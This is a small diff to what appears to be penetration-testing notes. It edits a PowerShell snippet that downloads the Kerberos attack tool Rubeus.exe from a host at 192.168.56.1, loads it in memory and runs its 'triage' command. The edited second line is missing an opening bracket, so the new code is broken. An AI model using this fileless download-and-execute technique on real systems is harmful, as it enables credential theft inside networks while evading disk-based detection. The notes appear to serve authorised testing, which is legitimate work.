@@ -93,6 +93,7 @@ Rubeus.exe:
 
 ```bash
 $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/Rubeus.exe') 
-$assem = [System.Reflection.Assembly]::Load($data); [Rubeus.Program]::MainString("triage");
+$assem = [System.Reflection.Assembly]::Load($data);
+Rubeus.Program]::MainString("triage");
 ```
 
